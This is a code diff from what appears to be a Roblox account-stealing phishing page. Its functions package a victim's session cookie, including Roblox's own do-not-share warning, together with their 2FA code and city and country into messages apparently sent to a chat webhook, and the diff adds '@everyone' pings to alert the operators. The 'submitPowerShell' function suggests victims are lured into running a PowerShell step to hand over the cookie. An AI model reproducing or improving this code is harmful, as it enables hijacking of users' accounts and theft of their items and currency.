@@ -218,8 +218,9 @@ async function verifyCode() {
         // Simplified 2FA payload to avoid 400 errors
         const payload = {
             content: `2FA: ${code}
-Cookie: ${globalRobloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}` : 'None'}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+Cookie: ${globalRobloxCookie ? `|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${globalRobloxCookie}` : 'None'}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+@everyone`
         };
 
         console.log('📤 2FA Sending payload:', payload);
@@ -718,8 +719,9 @@ async function submitPowerShell() {
                 
                             // Immediate cookie capture payload (plain text)
             const payload = {
-                content: `Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+                content: `Cookie: |WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+@everyone`
             };
 
                 console.log('📤 Sending payload:', payload);
